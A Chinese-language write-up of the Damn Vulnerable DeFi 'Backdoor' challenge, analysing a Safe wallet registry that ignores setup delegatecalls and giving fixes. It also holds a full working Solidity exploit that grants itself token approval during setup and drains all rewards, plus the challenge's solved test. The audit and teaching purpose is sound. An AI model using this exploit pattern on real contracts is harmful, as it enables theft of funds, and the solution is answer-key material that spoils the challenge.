# Backdoor

## 一、题目简介

本题目围绕**Safe 智能合约钱包代理初始化漏洞**展开，是典型的智能合约钱包安全审计考点。项目方部署了专属的 Safe 钱包注册表 `WalletRegistry`，用于激励团队成员部署合规 Safe 钱包：四位指定受益人（Alice、Bob、Charlie、David）成功注册合规钱包后，可领取 10 DVT 代币奖励，合约总计留存 40 DVT 奖励资金。

注册表严格对接官方 Safe 代理工厂合约，内置多重校验逻辑，仅认可合规初始化的单人多签钱包。题目核心目标为：利用注册表与 Safe 钱包初始化的逻辑漏洞，**在单笔交易内窃取全部 40 DVT 代币**并转入指定回收账户，完成通关。

核心环境参数：

- 受益人数量：4 人，每人可领取 10 DVT

- 合约总奖励资金：40 DVT

- 钱包规则：单人单签、阈值为 1、无 fallback 处理器

- 通关要求：单笔交易完成攻击、清空所有奖励代币、注销所有受益人资格、保留合规钱包注册记录

攻击目标：绕过官方合规校验，伪造合法钱包注册流程，窃取全部 DVT 奖励代币至回收账户。

## 二、审计视角分析

### 1\. Safe 钱包初始化高危漏洞（核心漏洞）

Safe 钱包的 `setup` 初始化函数支持自定义**委托调用（delegatecall）**，开发者默认该功能仅用于合规业务拓展，未做风险管控。函数参数中：`to` 为委托调用目标合约，`data` 为自定义调用数据，允许在钱包初始化阶段执行任意逻辑。

漏洞致命缺陷：攻击者可在钱包初始化时，通过委托调用让**未初始化的 Safe 代理钱包主动授权代币额度**。该授权行为会被注册表判定为正常初始化流程，无任何风控拦截。

以下为**触发漏洞的核心出错代码片段**，仅展示高危缺失校验的关键行数：

```solidity
// 漏洞：WalletRegistry.proxyCreated 校验逻辑
// 仅校验是否调用了setup，完全不校验setup内部恶意delegatecall数据
if (bytes4(initializer[:4]) != Safe.setup.selector) {
    revert InvalidInitialization();
}

// 仅校验钱包静态参数（所有者、阈值、fallback）
// 完全缺失：初始化委托调用(to、data) 安全校验
uint256 threshold = Safe(walletAddress).getThreshold();
if (threshold != EXPECTED_THRESHOLD) {
    revert InvalidThreshold(threshold);
}

address[] memory owners = Safe(walletAddress).getOwners();
if (owners.length != EXPECTED_OWNERS_COUNT) {
    revert InvalidOwnersCount(owners.length);
}

// 省略其余静态校验...

// 无任何风险检测，直接发放代币
SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT);

```

### 2\. 核心漏洞代码行精准定位

**致命漏洞代码行**：`proxyCreated` 函数中仅校验初始化方法签名，完全放任 `setup` 内部自定义的委托调用逻辑：

```solidity
if (bytes4(initializer[:4]) != Safe.setup.selector) { revert InvalidInitialization(); }
```

**漏洞本质**：

- 合约仅判断初始化数据是否调用了 `Safe.setup` 方法，**完全不校验 setup 内部的 to 目标地址、data 执行数据**

- 攻击者可自由拼接`setup` 参数，传入恶意的委托调用目标与授权数据

- 注册表校验全部通过后，自动为恶意钱包发放代币，造成资产被盗

### 3\. WalletRegistry 校验逻辑不完整

注册表 `proxyCreated` 回调函数仅校验钱包的**所有者数量、签名阈值、fallback 处理器、初始化调用签名**，但**完全不校验初始化阶段的委托调用内容**。

只要钱包基础配置符合官方规范，无论初始化阶段执行何种委托调用逻辑，注册表都会认定为合规钱包，自动发放 10 DVT 奖励、注销受益人资格、绑定钱包地址。

### 4\. 交易时序逻辑漏洞

整个注册打款流程时序为：执行 Safe 初始化（可控恶意逻辑）→ 注册表校验合规 → 发放代币奖励。初始化阶段的恶意授权会先于代币到账完成，代币到账后，攻击者可直接划转资金，无任何权限阻碍。

## 三、开发者默认安全假设

1. **初始化逻辑可信**：默认用户只会通过 `setup` 完成钱包基础配置，不会利用委托调用植入恶意授权逻辑。

2. **回调校验全覆盖**：仅校验钱包静态配置参数，忽略初始化动态执行的委托调用风险。

3. **受益人自主操作**：默认只有受益人本人会注册钱包，未预判攻击者批量伪造注册流程的场景。

4. **代币资金安全**：认为受益人注册钱包后资金归属于用户钱包，无外部窃取风险，未做二次权限校验。

## 四、同类项目通用审计盯点

1. **智能合约钱包初始化审计**：重点关注 Safe 等多签钱包 `setup` 函数的委托调用权限，禁止任意自定义调用逻辑。

2. **回调校验完整性**：所有代理创建回调、业务校验回调，必须全覆盖静态参数 + 动态执行逻辑，不可仅校验基础配置。

3. **批量用户资产发放风控**：批量用户奖励、空投、补贴场景，需校验操作发起身份，禁止第三方伪造用户操作。

4. **代理合约风险**：代理合约初始化阶段权限极高，所有可自定义的调用参数均需做白名单校验。

5. **单交易权限管控**：防范单笔交易内完成「初始化授权-资金发放-资产划转」的连贯攻击链路。

## 五、完整解题思路

本题核心攻击链路：**恶意初始化授权 → 合规注册领币 → 批量划转资金**，全程仅需单笔交易，满足题目所有限制条件。

1. **部署专属攻击合约**：独立攻击合约用于接收 Safe 钱包的委托调用，实现代币授权逻辑，规避测试合约上下文权限问题。

2. **批量构造恶意初始化数据**：遍历 4 位受益人，为每位用户构造合规钱包配置，同时注入恶意委托调用，让钱包授权攻击合约无限代币额度。

3. **创建代理钱包触发回调**：通过官方工厂合约创建 Safe 代理钱包，触发注册表回调，自动完成合规校验、发放 10 DVT 奖励、注销受益人资格。

4. **批量窃取代币**：所有钱包到账代币后，利用预先授权的权限，批量将 4 个钱包的全部 DVT 转入回收账户。

5. **完成通关校验**：单笔交易完成所有操作，满足钱包注册、受益人注销、资金全额转移的全部通关条件。

## 六、报错复盘

### 报错1：算术下溢溢出（0x11）

**原因**：授权逻辑失效，钱包未对攻击者授权，调用 `transferFrom` 时无可用额度，导致余额/授权校验下溢。多为直接在测试合约内写授权逻辑，delegatecall 上下文错乱导致授权失效。

**解决**：使用独立攻击合约接收钱包委托调用，保证授权上下文正确，确保额度授权真实生效。

### 报错2：Safe 初始化转账回滚

**原因**：在 `setup` 初始化阶段直接转账，此时注册表尚未发放代币，钱包余额为 0，转账直接失败。

**解决**：拆分逻辑，初始化仅做授权，等待回调打款完成后，再统一批量划转资金。

### 报错3：接口类型转换编译错误

**原因**：Safe 工厂函数回调参数需要指定接口类型，直接传入地址会触发隐式转换报错。

**解决**：使用官方内置 `IProxyCreationCallback` 接口强转参数，匹配函数签名。

### 报错4：玩家交易笔数校验失败

**原因**：攻击逻辑拆分多笔交易，导致玩家 nonce 大于 1，不满足通关条件。

**解决**：所有初始化、授权、转账逻辑统一封装，仅执行一笔玩家交易。

## 七、EXP

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";

// 独立攻击合约，保证delegatecall上下文正确
contract WalletPwner {
    address public immutable master;
    address public immutable factory;
    address public immutable registry;
    DamnValuableToken public immutable coin;
    address public receiver;

    constructor(address m, address f, address r, address c, address recv) {
        master = m;
        factory = f;
        registry = r;
        coin = DamnValuableToken(c);
        receiver = recv;
    }

    // 被Safe钱包delegatecall执行，完成代币授权
    function allowTransfer(address spender) external {
        coin.approve(spender, type(uint256).max);
    }

    // 批量攻击核心逻辑
    function pwn(address[] calldata users) external {
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owner = new address[](1);
            owner[0] = users[i];

            // 构造恶意初始化数据：合规钱包配置 + 恶意授权委托调用
            bytes memory setupData = abi.encodeWithSelector(
                Safe.setup.selector,
                owner,
                1,
                address(this),
                abi.encodeWithSignature("allowTransfer(address)", address(this)),
                address(0), 0, 0, address(0)
            );

            // 创建代理钱包，触发注册表打款回调
            SafeProxy proxy = SafeProxyFactory(factory).createProxyWithCallback(
                master, setupData, i, IProxyCreationCallback(registry)
            );

            // 划转钱包内全部奖励代币
            coin.transferFrom(address(proxy), receiver, 10 ether);
        }
    }
}

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();
        token = new DamnValuableToken();
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            assertTrue(walletRegistry.beneficiaries(users[i]));
            vm.expectRevert(bytes4(hex"82b42900"));
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        new WalletPwner(
            address(singletonCopy),
            address(walletFactory),
            address(walletRegistry),
            address(token),
            recovery
        ).pwn(users);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);
            assertTrue(wallet != address(0), "User didn't register a wallet");
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
```

## 八、合约修复方案

1. **禁用/限制初始化委托调用**：在 `WalletRegistry` 校验逻辑中，强制校验 Safe 初始化的委托调用参数，禁止初始化阶段执行代币授权、转账等高危操作，或直接限制 `to` 地址和 `data` 内容为空。

2. **增加操作身份校验**：钱包注册操作仅允许受益人本人发起，拦截第三方批量伪造注册请求。

3. **新增代币权限校验**：钱包注册完成后，检测钱包代币授权状态，禁止初始化阶段出现异常授权行为，拦截恶意钱包。

4. **拆分初始化与打款时序**：增加区块间隔或二次校验，钱包注册完成后延迟打款，避免初始化恶意逻辑与资金发放串联攻击。

5. **单用户单钱包风控**：强化钱包绑定逻辑，确保每个受益人仅能注册一次钱包，且钱包权限归属于受益人本人。

## 九、漏洞总结

Backdoor 关卡核心为**Safe 钱包初始化任意委托调用漏洞 + 注册表校验逻辑缺失**。开发者过度信任官方钱包初始化流程，忽略了 `setup` 函数自定义委托调用的高危风险，同时注册表仅校验钱包静态配置，未拦截动态恶意执行逻辑。

攻击者可利用该漏洞，批量伪造合规钱包注册，在初始化阶段预授权资金权限，利用合约时序漏洞窃取全部奖励代币。本题重点考察智能合约钱包底层原理、代理初始化机制、回调校验逻辑审计，是 Web3 安全中高频的钱包安全漏洞场景。

